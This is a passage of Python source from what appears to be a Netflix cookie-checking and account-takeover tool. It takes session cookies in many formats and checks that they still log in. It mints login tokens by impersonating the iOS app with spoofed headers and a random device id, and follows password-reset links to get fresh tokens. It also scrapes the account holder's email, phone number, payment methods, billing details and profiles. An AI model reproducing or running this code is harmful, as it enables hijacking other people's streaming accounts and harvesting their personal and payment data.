        # Try loading from headers (looks for "Cookie: ")
        if 'cookie:' in cookie_input.lower():
            if self.load_cookies_from_headers(cookie_input):
                logger.info("Loaded cookies from Header String.")
                return "Header String"

        # Try loading as Netscape (crude check for tab separation)
        if '\t' in cookie_input and 'netflix.com' in cookie_input:
            header_str = convert_netscape_to_header_string(cookie_input)
            if header_str and self.load_cookies_from_string(header_str):
                logger.info("Loaded cookies as Netscape.")
                return "Netscape"

        # Fallback to plain string
        if self.load_cookies_from_string(cookie_input):
            logger.info("Loaded cookies as Plain String.")
            return "Plain String"

        logger.error("Failed to load cookies from any known format.")
        return None

    def load_cookies_from_string(self, cookie_string):
        """Load cookies from browser cookie string format"""
        try:
            self.session.cookies.clear()
            cookie_string = _clean_cookie_candidate(cookie_string)
            # --- NEW: convert '|' to ';' if both NetflixId and SecureNetflixId are present ---
            if 'NetflixId=' in cookie_string and 'SecureNetflixId=' in cookie_string and '|' in cookie_string:
                cookie_string = cookie_string.replace(' | ', '; ').replace('|', ';')
            cookie_string = re.sub(r'[\r\n]+(?=\s*[\w.-]+\s*[=:])', '; ', cookie_string)
            cookie_string = re.sub(
                r'\s+(?=(?:NetflixId|SecureNetflixId|nfvdid|flwssn|memclid|OptanonConsent)\s*[=:])',
                '; ',
                cookie_string,
            )
            for key in ("NetflixId", "SecureNetflixId", "nfvdid"):
                cookie_string = re.sub(rf'\b{key}\s*:', f'{key}=', cookie_string)

            cookie_pairs = cookie_string.split(';')

            cookies_loaded = 0
            ignored_attributes = {'domain', 'path', 'expires', 'max-age', 'secure', 'httponly', 'samesite', 'priority'}
            for cookie_pair in cookie_pairs:
                cookie_pair = cookie_pair.strip()
                if '=' in cookie_pair:
                    name, value = cookie_pair.split('=', 1)
                    name = name.strip()
                    value = value.strip()

                    if name.startswith('#HttpOnly_'):
                        name = name[len('#HttpOnly_'):]

                    if not name or name.lower() in ignored_attributes:
                        continue
                    if not re.fullmatch(r"[A-Za-z0-9_.$!#%&'*+\-.^`|~]+", name):
                        continue

                    # Ensure cookie value is ASCII (URL-encode if needed)
                    value = _ensure_ascii_cookie_value(value)

                    self.session.cookies.set(
                        name=name,
                        value=value,
                        domain='.netflix.com',
                        path='/',
                        secure=True
                    )
                    cookies_loaded += 1

            logger.info(f"Successfully loaded {cookies_loaded} cookies")
            has_netflix_cookie = any(cookie.name in NETFLIX_COOKIE_NAMES for cookie in self.session.cookies)
            return cookies_loaded > 0 and has_netflix_cookie

        except (TypeError, ValueError, UnicodeError, re.error) as e:
            logger.error(f"Error loading cookies: {e}")
            return False

    def load_cookies_from_json(self, cookie_json):
        """Load cookies from JSON format"""
        try:
            self.session.cookies.clear()
            cookies_loaded = 0

            for candidate in _json_cookie_candidates(cookie_json):
                if self.load_cookies_from_input(candidate):
                    return True

            # Handle different JSON formats
            if isinstance(cookie_json, list):
                # List of cookie objects
                for cookie in cookie_json:
                    if isinstance(cookie, str):
                        if self.load_cookies_from_string(cookie):
                            cookies_loaded += len(self.session.cookies)
                    elif isinstance(cookie, dict) and 'name' in cookie and 'value' in cookie:
                        # Ensure value is ASCII
                        value = _ensure_ascii_cookie_value(str(cookie['value']))
                        self.session.cookies.set(
                            name=cookie['name'],
                            value=value,
                            domain=cookie.get('domain', '.netflix.com'),
                            path=cookie.get('path', '/'),
                            secure=cookie.get('secure', True)
                        )
                        cookies_loaded += 1
            elif isinstance(cookie_json, dict):
                for key in ('cookies', 'Cookies', 'cookieList'):
                    nested = cookie_json.get(key)
                    if isinstance(nested, (list, dict)):
                        return self.load_cookies_from_json(nested)

                for key in ('cookie', 'Cookie'):
                    nested = cookie_json.get(key)
                    if isinstance(nested, str):
                        return self.load_cookies_from_input(nested)

                headers = cookie_json.get('headers') or cookie_json.get('Headers')
                if isinstance(headers, dict):
                    for key, value in headers.items():
                        if key.lower() == 'cookie' and isinstance(value, str):
                            return self.load_cookies_from_input(value)

                # Single cookie object or key-value pairs
                if 'name' in cookie_json and 'value' in cookie_json:
                    # Single cookie object
                    value = _ensure_ascii_cookie_value(str(cookie_json['value']))
                    self.session.cookies.set(
                        name=cookie_json['name'],
                        value=value,
                        domain=cookie_json.get('domain', '.netflix.com'),
                        path=cookie_json.get('path', '/'),
                        secure=cookie_json.get('secure', True)
                    )
                    cookies_loaded += 1
                else:
                    # Key-value pairs
                    for name, value in cookie_json.items():
                        if isinstance(value, (dict, list)):
                            continue
                        value = _ensure_ascii_cookie_value(str(value))
                        self.session.cookies.set(
                            name=name,
                            value=value,
                            domain='.netflix.com',
                            path='/',
                            secure=True
                        )
                        cookies_loaded += 1

            logger.info(f"Successfully loaded {cookies_loaded} cookies from JSON")
            has_netflix_cookie = any(cookie.name in NETFLIX_COOKIE_NAMES for cookie in self.session.cookies)
            return cookies_loaded > 0 and has_netflix_cookie

        except (AttributeError, TypeError, ValueError, UnicodeError) as e:
            logger.error(f"Error loading cookies from JSON: {e}")
            return False

    def load_cookies_from_headers(self, header_string):
        """Extract and load cookies from header string"""
        try:
            cookie_headers = re.findall(
                r'(?im)(?<!set-)\bcookie\s*:\s*([^\r\n\'"`]+)',
                header_string,
            )
            if cookie_headers:
                cookie_string = '; '.join(_clean_cookie_candidate(header) for header in cookie_headers)
                return self.load_cookies_from_string(cookie_string)

            set_cookie_headers = re.findall(
                r'(?im)\bset-cookie\s*:\s*([^\r\n\'"`]+)',
                header_string,
            )
            if set_cookie_headers:
                cookies = []
                for header_value in set_cookie_headers:
                    parsed = SimpleCookie()
                    parsed.load(_clean_cookie_candidate(header_value))
                    cookies.extend(f"{name}={morsel.value}" for name, morsel in parsed.items())

                if cookies:
                    return self.load_cookies_from_string('; '.join(cookies))

            logger.error("No Cookie header found in header string")
            return False

        except (AttributeError, CookieError, re.error, ValueError) as e:
            logger.error(f"Error extracting cookies from headers: {e}")
            return False

    def load_session_from_nftoken(self, token: str) -> bool:
        """Use a Netflix nftoken login URL to populate the session cookies."""
        self.nftoken_info = {
            "token": normalize_nftoken(token),
            "netflix_url": build_nftoken_login_urls(token)["pc"],
            "status": "success",
        }
        try:
            response = self._get(
                self.nftoken_info["netflix_url"],
                headers={
                    "User-Agent": self.user_agent,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                },
                allow_redirects=True,
                timeout=30,
            )
            if response.status_code >= 400:
                logger.warning("NFToken login returned HTTP %s", response.status_code)
                return False

            content = response.text.lower()
            login_indicators = [
                "sign in to netflix",
                "email or phone number",
                'data-uia="login',
                "netflix.com/login",
                "forgot your password",
            ]
            if any(indicator in content for indicator in login_indicators):
                logger.warning("NFToken login redirected to the sign-in page")
                return False

            return True
        except requests.exceptions.RequestException as e:
            logger.error(f"Error loading session from NFToken: {e}")
            return False

    def _session_cookie_header(self) -> str:
        return "; ".join(f"{cookie.name}={cookie.value}" for cookie in self.session.cookies)

    def _extract_account_id_from_url(self, url: str | None) -> str | None:
        if not url:
            return None

        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for name in ("g", "account_id", "uid", "user_id", "id", "session"):
                value = params.get(name)
                if value and value[0]:
                    return value[0]
        except ValueError:
            return None

        for pattern in (
            r"/account/([A-Za-z0-9_-]+)",
            r"/user/([A-Za-z0-9_-]+)",
            r"/([A-Za-z0-9_-]{16,})",
        ):
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        return None

    def _extract_next_reset_url(self, response_text: str, base_url: str) -> str | None:
        match = re.search(r'href=["\']([^"\']*(?:reset|password)[^"\']+)["\']', response_text, re.IGNORECASE)
        if not match:
            return None

        next_url = html.unescape(match.group(1))
        if not next_url.startswith("http"):
            next_url = urllib.parse.urljoin(base_url, next_url)
        if "netflix.com" not in urllib.parse.urlparse(next_url).netloc.lower():
            return None
        return next_url

    def _get_nftoken_from_current_session(self, old_tokens: list[str]) -> str | None:
        cookie_header = self._session_cookie_header()
        if not cookie_header:
            return None

        sry = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(75))
        esn = f"NFAPPL-02-IPHONE9=3-PXA-{sry}"
        encoded_esn = urllib.parse.quote(esn)
        trace_id = ''.join(random.choice(string.hexdigits.upper()) for _ in range(36))
        top_level_id = ''.join(random.choice(string.hexdigits.upper()) for _ in range(36))

        params = {
            "appVersion": "15.48.1",
            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
            "device_type": "NFAPPL-02-",
            "esn": encoded_esn,
            "idiom": "phone",
            "iosVersion": "15.8.5",
            "isTablet": "false",
            "languages": "en-IN",
            "locale": "en-IN",
            "maxDeviceWidth": "375",
            "model": "saget",
            "modelType": "IPHONE9-3",
            "odpAware": "true",
            "path": '["account","token","default"]',
            "pathFormat": "graph",
            "pixelDensity": "2.0",
            "progressive": "false",
            "responseFormat": "json",
        }
        headers = {
            "x-netflix.request.attempt": "1",
            "x-netflix.client.idiom": "phone",
            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
            "x-netflix.context.app-version": "15.48.1",
            "x-netflix.argo.translated": "true",
            "x-netflix.context.form-factor": "phone",
            "x-netflix.context.sdk-version": "2012.4",
            "accept": "*/*",
            "x-netflix.client.appversion": "15.48.1",
            "accept-encoding": "gzip, deflate, br",
            "x-netflix.context.max-device-width": "375",
            "x-netflix.context.ab-tests": "",
            "user-agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
            "x-netflix.tracing.cl.useractionid": trace_id,
            "cookie": cookie_header,
            "x-netflix.client.type": "argo",
            "x-netflix.client.ftl.esn": esn,
            "x-netflix.context.locales": "en-IN",
            "x-netflix.context.top-level-uuid": top_level_id,
            "x-netflix.client.iosversion": "15.8.5",
            "accept-language": "en-IN;q=1",
            "x-netflix.argo.abtests": "",
            "x-netflix.context.os-version": "15.8.5",
            "x-netflix.request.client.context": '{"appState":"foreground"}',
            "x-netflix.context.ui-flavor": "argo",
            "x-netflix.argo.nfnsm": "9",
            "x-netflix.context.pixel-density": "2.0",
            "x-netflix.request.toplevel.uuid": top_level_id,
            "x-netflix.request.client.timezoneid": "US/Pacific",
        }

        try:
            response = self._get(
                "https://ios.prod.ftl.netflix.com/iosui/user/15.48",
                params=params,
                headers=headers,
                timeout=30,
            )
            if response.status_code == 429:
                logger.warning("Netflix mobile token API returned HTTP 429")
                return None
            if response.status_code >= 400:
                logger.warning("Netflix mobile token API returned HTTP %s", response.status_code)
                return None

            return _select_new_token(extract_tokens_from_response_text(response.text), old_tokens)
        except requests.exceptions.RequestException as e:
            logger.error(f"Error getting NFToken from current reset session: {e}")
            return None

    def follow_reset_link_and_get_token(self, reset_text: str, max_retries: int = 3) -> tuple[str | None, str | None]:
        """Follow a Netflix reset link and return the newest nftoken found."""
        reset_url = extract_netflix_url_from_text(reset_text)
        if not reset_url:
            return None, None

        original_tokens = extract_tokens_from_response_text(reset_text)
        current_url = reset_url
        final_url = None
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }

        for attempt in range(max_retries):
            try:
                response = self._get(
                    current_url,
                    headers=headers,
                    allow_redirects=True,
                    timeout=30,
                )
            except requests.exceptions.RequestException as e:
                logger.error(f"Error following reset link: {e}")
                return None, final_url

            final_url = response.url
            candidates = []
            candidates.extend(extract_tokens_from_response_text(final_url))
            candidates.extend(token for token in extract_tokens_from_response_text(response.text) if token not in candidates)

            token = _select_new_token(candidates, original_tokens)
            if not token:
                token = self._get_nftoken_from_current_session(original_tokens)

            if token:
                self.nftoken_info = {
                    "token": normalize_nftoken(token),
                    "netflix_url": build_nftoken_login_urls(token)["pc"],
                    "status": "success",
                }
                return token, final_url

            next_url = self._extract_next_reset_url(response.text, final_url)
            if not next_url or next_url == current_url or attempt == max_retries - 1:
                break
            current_url = next_url

        logger.warning("Reset link did not produce a new NFToken; original token was ignored")
        return None, final_url

    def check_cookies_validity(self):
        """Check if cookies are valid before proceeding"""
        try:
            headers = {
                'User-Agent': self.user_agent,
                'Referer': 'https://www.netflix.com/',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }

            response = self._get('https://www.netflix.com/browse', headers=headers, timeout=30)

            # Check if we're redirected to login or see login elements
            if response.status_code != 200:
                return False

            content = response.text.lower()
            login_indicators = [
                'sign in to netflix', 'email or phone number', 'data-uia="login',
                'netflix.com/login', 'enter your email', 'forgot your password',
                'create account', 'member sign in'
            ]

            # If any login indicator is found, cookies are invalid
            for indicator in login_indicators:
                if indicator in content:
                    return False

            return True

        except requests.exceptions.RequestException as e:
            logger.error(f"Error checking cookie validity: {e}")
            return False

    def extract_account_data(self, content):
        """Extract comprehensive account data from Netflix response using multiple methods"""
        patterns = {
            'Plan': [r'"localizedPlanName":{"fieldType":"String","value":"([^"]+)"', r'"planName":"([^"]+)"', r'"planType":"([^"]+)"', r'"formattedPlanName":"([^"]+)"'],
            'VideoQuality': [r'"videoQuality":{"fieldType":"String","value":"([^"]+)"', r'"videoQuality":"([^"]+)"'],
            'MaxStreams': [r'"maxStreams":{"fieldType":"Numeric","value":([^}]+)}', r'"maxStreams":([0-9]+)'],
            'NextBillingDate': [r'"nextBillingDate":{"fieldType":"String","value":"([^"]+)"},"showPaymentSection":{"fieldType":"Boolean","value":true}', r'"estimatedPaidThroughDate":{"fieldType":"String","value":"([^"]+)"', r'"nextBillingDate":"([^"]+)"'],
            'MembershipStatus': [r'"membershipStatus":{"fieldType":"String","value":"([^"]+)"', r'"membershipStatus":"([^"]+)"', r'"status":"([^"]+)"', r'"isActive":(true|false)', r'"accountState":"([^"]+)"'],
            'AccountId': [r'"accountId":{"fieldType":"String","value":"([^"]+)"', r'"accountId":"([^"]+)"'],
            'Country': [r'"countryOfSignup":{"fieldType":"String","value":"([^"]+)"', r'"countryOfSignup":"([^"]+)"', r'"country":"([^"]+)"', r'"countryOfRegistration":"([^"]+)"', r'"userCountryOfSignup":"([^"]+)"', r'"accountCountry":"([^"]+)"'],
            'Currency': [r'"currency":{"fieldType":"String","value":"([^"]+)"', r'"currency":"([^"]+)"'],
            'MemberSince': [r'"memberSince":{"fieldType":"Numeric","value":([0-9]+)}', r'"memberSince":{"fieldType":"String","value":"([^"]+)"', r'"memberSince":"([^"]+)"', r'"joinDate":"([^"]+)"'],
            'Email': [r'"email":{"fieldType":"String","value":"([^"]+)"', r'"email":"([^"]+)"', r'"userEmail":"([^"]+)"', r'"user":{"fieldType":"Object","value":{"email":{"fieldType":"String","value":"([^"]+)"', r'<input[^>]*type="email"[^>]*value="([^"]+)"', r'"emailAddress":"([^"]+)"'],
            'DisplayLanguage': [r'"fallbackDisplayName":"([^"]+)"'],
            'IsUserOnHold': [r'"isUserOnHold":(true|false)', r'"isOnHold":(true|false)']
        }

        extracted = {}
        for key, pattern_list in patterns.items():
            for pattern in pattern_list:
                match = re.search(pattern, content)
                if match:
                    value = match.group(1)

                    if key == 'MemberSince' and pattern.startswith(r'"memberSince":{"fieldType":"Numeric","value":'):
                        try:
                            timestamp_ms = int(value)
                            timestamp_seconds = timestamp_ms / 1000
                            dt = datetime.fromtimestamp(timestamp_seconds)
                            value = dt.strftime('%d %b %Y')
                        except (ValueError, TypeError):
                            value = "N/A"

                    # Decode unicode escapes for all fields
                    value = decode_unicode_escapes(value)

                    if key in ['Plan', 'DisplayLanguage', 'NextBillingDate'] and '\\x20' in value:
                        value = value.replace('\\x20', ' ')

                    extracted[key] = value
                    logger.debug(f"Extracted {key}: {value}")
                    break  # Stop after first match for this key

        # ---- NEW FIELDS ----
        # Extra Members
        extra_members = re.search(r'"extraMemberSlots":\s*(\d+)', content)
        if extra_members:
            extracted['ExtraMembers'] = extra_members.group(1)

        # AddOns (look for contentAddOns)
        addons_match = re.search(r'"contentAddOns":\s*\[(.*?)\]', content, re.DOTALL)
        if addons_match:
            extracted['AddOns'] = addons_match.group(1)

        # Pause status
        pause = re.search(r'"pauseAttributes":\s*{[^}]*"status":"([^"]+)"[^}]*"endDate":"([^"]+)"', content)
        if pause:
            extracted['PauseStatus'] = pause.group(1)
            extracted['PauseEndDate'] = pause.group(2)

        # Cancellation
        cancel = re.search(r'"cancelAttributes":\s*{[^}]*"status":"([^"]+)"[^}]*"cancelDate":"([^"]+)"', content)
        if cancel:
            extracted['CancellationStatus'] = cancel.group(1)
            extracted['CancellationDate'] = cancel.group(2)

        # BundleType
        bundle = re.search(r'"bundleType":\s*"([^"]+)"', content)
        if bundle:
            extracted['BundleType'] = bundle.group(1)

        # GiftBalance
        gift = re.search(r'"giftBalance":\s*"([^"]+)"', content)
        if gift:
            extracted['GiftBalance'] = gift.group(1)

        # Profiles and their GUIDs
        profile_guids = re.findall(r'"guid":"([A-Z0-9]+)"', content)
        profile_names = re.findall(r'"localizedPlanName":"([^"]+)"', content)  # Legacy method

        # New Apollo GraphQL format: "Profile:{\"guid\":\"QNK...\"}":{"__typename":"Profile",..."name":"Farman"}
        apollo_profiles = re.findall(r'"Profile:\\?{\\"guid\\":\\"([A-Z0-9]+)\\"\\?}":\{[^}]*"name":"([^"]+)"', content)
        if apollo_profiles:
            # We want to preserve uniqueness and ordering
            seen_guids = set()
            extracted_guids = []
            extracted_names = []
            for guid, name in apollo_profiles:
                if guid not in seen_guids:
                    seen_guids.add(guid)
                    extracted_guids.append(guid)
                    extracted_names.append(decode_unicode_escapes(name))
            
            extracted['ProfilesGuids'] = extracted_guids
            extracted['Profiles'] = extracted_names
        else:
            # Better fallback: extract from profiles list block
            profiles_match = re.search(r'"profiles":\s*\[(.*?)\]', content, re.DOTALL)
            if profiles_match:
                profiles_block = profiles_match.group(1)
                # Extract name and guid from each profile object
                profile_entries = re.findall(r'\{"guid":"([^"]+)","name":"([^"]+)"', profiles_block)
                if profile_entries:
                    extracted['ProfilesGuids'] = [p[0] for p in profile_entries]
                    extracted['Profiles'] = [decode_unicode_escapes(p[1]) for p in profile_entries]
                else:
                    if profile_guids:
                        extracted['ProfilesGuids'] = profile_guids
            else:
                if profile_guids:
                    extracted['ProfilesGuids'] = profile_guids

        return extracted

    def determine_account_status(self, content):
        """Improved status detection using multiple signals."""
        membership = self.account_data.get('MembershipStatus', '').lower()
        on_hold = self.account_data.get('IsUserOnHold', 'false') == 'true'
        cancel_status = self.account_data.get('CancellationStatus', '').lower()
        next_billing = self.account_data.get('NextBillingDate', '')

        if on_hold:
            return 'Hold'
        if cancel_status == 'cancelled' or 'former_member' in membership:
            return 'Inactive'
        if membership in ('current_member', 'active'):
            # Check if next billing is missing (could be expired)
            if not next_billing or next_billing == 'N/A':
                # Additional check: maybe fetch browse page to confirm
                try:
                    resp = self._get('https://www.netflix.com/browse', timeout=10)
                    if resp.status_code == 200 and 'sign in' not in resp.text.lower():
                        return 'Active'
                    else:
                        return 'Inactive'
                except:
                    pass
            return 'Active'
        return 'Unknown'

    def extract_payment_data_from_account_page(self, content):
        """Extract payment data directly from the /account page JSON."""
        try:
            # Extract payment methods
            payment_match = re.search(r'"paymentMethods":\s*{"fieldType":"Custom","value":(\[.*?\])\}', content)
            payment_methods = []

            if payment_match:
                payment_json_str = payment_match.group(1)
                payment_data = json.loads(payment_json_str)

                for item in payment_data:
                    value = item.get("value", {})
                    cc_type = value.get("type", {}).get("value", "N/A")
                    payment_method_type = value.get("paymentMethod", {}).get("value", "N/A")
                    display_text = value.get("displayText", {}).get("value", "N/A")

                    # Extract third-party payment methods
                    third_party_match = re.search(r'"paymentMethod":{"fieldType":"String","value":"([^"]+)"', str(item))
                    if third_party_match:
                        payment_method_type = third_party_match.group(1)

                    payment_methods.append({
                        "type": cc_type,
                        "method_type": payment_method_type,
                        "display": display_text
                    })

            # Extract third-party payment methods separately
            third_party_pattern = r'"paymentMethod":{"fieldType":"String","value":"([^"]+)"'
            third_party_matches = re.findall(third_party_pattern, content)

            for method in third_party_matches:
                if method not in [m['method_type'] for m in payment_methods]:
                    payment_methods.append({
                        "type": "Third Party",
                        "method_type": method,
                        "display": method
                    })
                    
            # Check for Apollo GraphQL payment methods (e.g. Airtel, Packages)
            if not payment_methods:
                apollo_payments = re.findall(r'"growthPaymentMethods":\[\{(.*?)\}\]', content)
                if apollo_payments:
                    for method_str in apollo_payments:
                        disp_match = re.search(r'"displayText":"([^"]+)"', method_str)
                        if disp_match:
                            method = disp_match.group(1)
                            payment_methods.append({
                                "type": "Partner",
                                "method_type": method,
                                "display": method
                            })

            return {"PaymentMethods": payment_methods}

        except (json.JSONDecodeError, AttributeError) as e:
            logger.error(f"Error parsing payment data from account page: {e}")
            return {}

    def extract_email_verification_status(self, content):
        """Extract email verification status"""
        try:
            email_verified_pattern = r'"__typename":"GrowthEmail","email":{[^}]+},"isVerified":(true|false)'
            match = re.search(email_verified_pattern, content)
            if match:
                return match.group(1) == "true"
            return None
        except (AttributeError, re.error) as e:
            logger.error(f"Error extracting email verification status: {e}")
            return None

    def extract_phone_verification_status(self, content):
        """Extract phone verification status from account page content"""
        try:
            # Look for phone verification patterns in the JSON data
            phone_verified_patterns = [
                r'"__typename":"GrowthPhone","phone":\{[^}]+\},"isVerified":(true|false)',
                r'"phoneVerificationStatus":"([^"]+)"',
                r'"isPhoneVerified":(true|false)'
            ]

            for pattern in phone_verified_patterns:
                match = re.search(pattern, content)
                if match:
                    if pattern == r'"phoneVerificationStatus":"([^"]+)"':
                        return match.group(1).lower() == 'verified'
                    else:
                        return match.group(1) == "true"

            return None
        except (AttributeError, re.error) as e:
            logger.error(f"Error extracting phone verification status: {e}")
            return None

    def fetch_security_page_info(self):
        """Fetches and parses the /account/security page for phone and verification status."""
        try:
            headers = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Referer': 'https://www.netflix.com/youraccount',
            }
            response = self._get('https://www.netflix.com/account/security', headers=headers, timeout=30)
            if response.status_code != 200:
                logger.warning(f"Failed to fetch /account/security page. Status: {response.status_code}")
                return

            content = response.text

            # Extract phone verification status
            phone_verified_match = re.search(r'"GrowthPhoneNumber",.*?"isVerified":(true|false)', content)
            if phone_verified_match:
                is_verified = phone_verified_match.group(1) == 'true'
                self.account_data['PhoneVerified'] = is_verified
                logger.info(f"Phone verification status from /security: {is_verified}")

            # Extract phone number
            phone_number_match = re.search(r'"phoneNumberDigits":{"__typename":"GrowthClearStringValue","value":"([^"]+)"}', content)
            if phone_number_match:
                phone_number = decode_unicode_escapes(phone_number_match.group(1))
                self.account_data['DetailedPhoneNumber'] = phone_number
                logger.info(f"Phone number from /security: {phone_number}")

        except (requests.exceptions.RequestException, AttributeError, re.error, UnicodeError) as e:
            logger.error(f"Error fetching or parsing /account/security page: {e}")

    def extract_phone_number(self, content):
        """Extract phone number if available (fallback method)"""
        try:
            phone_patterns = [r'"__typename":"GrowthPhone","phone":{"__typename":"GrowthClearStringValue","value":"([^"]+)"', r'"phoneNumber":"([^"]+)"', r'"phone":"([^"]+)"']

            for pattern in phone_patterns:
                match = re.search(pattern, content)
                if match:
                    phone = match.group(1)
                    phone = decode_unicode_escapes(phone)
                    return phone
            return None
        except (AttributeError, re.error, UnicodeError) as e:
            logger.error(f"Error extracting phone number: {e}")
            return None

    def extract_phone_details_from_account_info(self, content):
        """Extracts phone number and its country from the accountInfo JSON block."""
        try:
            start_str = '"accountInfo":{"data":'
            start_index = content.find(start_str)
            if start_index == -1:
                return {}

            start_index += len(start_str)

            # Find the start of the JSON object
            json_start_index = content.find('{', start_index)
            if json_start_index == -1:
                return {}

            brace_count = 1
            current_index = json_start_index + 1
            while current_index < len(content) and brace_count > 0:
                char = content[current_index]
                if char == '{':
                    brace_count += 1
                elif char == '}':
                    brace_count -= 1
                current_index += 1

            if brace_count != 0:
                # We didn't find a matching brace
                return {}

            json_str = content[json_start_index:current_index]

            # Clean the string before parsing
            cleaned_str = json_str.encode('latin-1').decode('unicode_escape', 'ignore')
            data = json.loads(cleaned_str)

            phone_number = data.get("phoneNumber")
            phone_country = data.get("country")

            if phone_number and phone_country:
                return {
                    "DetailedPhoneNumber": phone_number,
                    "PhoneCountryCode": phone_country
                }
        except (json.JSONDecodeError, AttributeError, IndexError) as e:
            logger.error(f"Could not parse accountInfo for phone details: {e}")

        return {}

    def extract_extra_members(self, content):
        """Extract extra members information"""
        try:
            extra_members_patterns = [r'"extraMembers":{.*?"isEligible":(true|false)', r'"isExtraMember":(true|false)', r'"hasExtraMembers":(true|false)']

            for pattern in extra_members_patterns:
                match = re.search(pattern, content)
                if match:
                    return match.group(1) == "true"
            return False
        except (AttributeError, re.error) as e:
            logger.error(f"Error extracting extra members: {e}")
            return False

    def extract_profiles_info(self):
        """Extract profile names and GUIDs from the /account/profiles page."""
        try:
            headers = {
                'User-Agent': self.user_agent,
                'Referer': 'https://www.netflix.com/browse',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }

            response = self._get('https://www.netflix.com/account/profiles', headers=headers, timeout=15)

            if not response.ok:
                logger.warning(f"Failed to fetch profiles page, status code: {response.status_code}")
                # Fallback to old method if new one fails
                return self.extract_profiles_from_manage_page()

            content = response.text
            profiles = []

            # This regex captures each profile block and then extracts name and guid from it.
            profile_blocks = re.findall(r'<li\sclass="profile".*?</li>', content, re.DOTALL)

            for block in profile_blocks:
                name_match = re.search(r'<span class="profile-name">(.*?)</span>', block)
                guid_match = re.search(r'data-profile-guid="(.*?)"', block)

                if name_match and guid_match:
                    name = html.unescape(name_match.group(1).strip())
                    guid = guid_match.group(1).strip()
                    if name:  # Ensure name is not empty
                        profiles.append({"name": name, "guid": guid})

            if not profiles:
                logger.warning("No profiles found on /account/profiles, attempting fallback.")
                return self.extract_profiles_from_manage_page()

            logger.info(f"Found {len(profiles)} profiles: {[p['name'] for p in profiles]}")
            return [p['name'] for p in profiles]  # Return just names for compatibility

        except (requests.exceptions.RequestException, AttributeError, re.error, UnicodeError) as e:
            logger.error(f"Error extracting profiles from /account/profiles: {e}")
            # Fallback to old method on any error
            return self.extract_profiles_from_manage_page()

    def extract_profiles_from_manage_page(self):
        """Fallback method to extract profiles from /profiles/manage."""
        logger.info("Using fallback profile extraction method.")
        try:
            headers = {
                'User-Agent': self.user_agent,
                'Referer': 'https://www.netflix.com/browse',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            response = self._get('https://www.netflix.com/profiles/manage', headers=headers, timeout=15)

            if not response.ok:
                logger.warning("Fallback profile extraction also failed.")
                return []

            content = response.text
            profiles = re.findall(r'"profileName":"([^"]+)"', content)

            unique_profiles = []
            seen_profiles = set()

            for profile in profiles:
                if profile and profile.strip():
                    cleaned = profile.strip()
                    cleaned = decode_unicode_escapes(cleaned)
                    cleaned = html.unescape(cleaned)

                    # More robust filtering for fake profiles
                    if len(cleaned) > 50 or "{" in cleaned or "}" in cleaned or ":" in cleaned:
                        continue

                    if cleaned.lower() not in seen_profiles and cleaned:
                        unique_profiles.append(cleaned)
                        seen_profiles.add(cleaned.lower())

            logger.info(f"Found {len(unique_profiles)} profiles via fallback: {unique_profiles}")
            return unique_profiles
        except (requests.exceptions.RequestException, AttributeError, re.error, UnicodeError) as e:
            logger.error(f"Error in fallback profile extraction: {e}")
            return []

    def get_nftoken(self, cookie_input):
        """Extract NFToken using the provided API logic"""
        try:
            def generate_random_string(length):
                """Generate random string with specified length"""
                chars = string.ascii_uppercase + string.digits
                return ''.join(random.choice(chars) for _ in range(length))

            # Generate new ESN
            sry = generate_random_string(75)
            esn = f"NFAPPL-02-IPHONE9=3-PXA-{sry}"
            encoded_esn = urllib.parse.quote(esn)

            # Prepare the URL with parameters
            base_url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
            params = {
                "appVersion": "15.48.1",
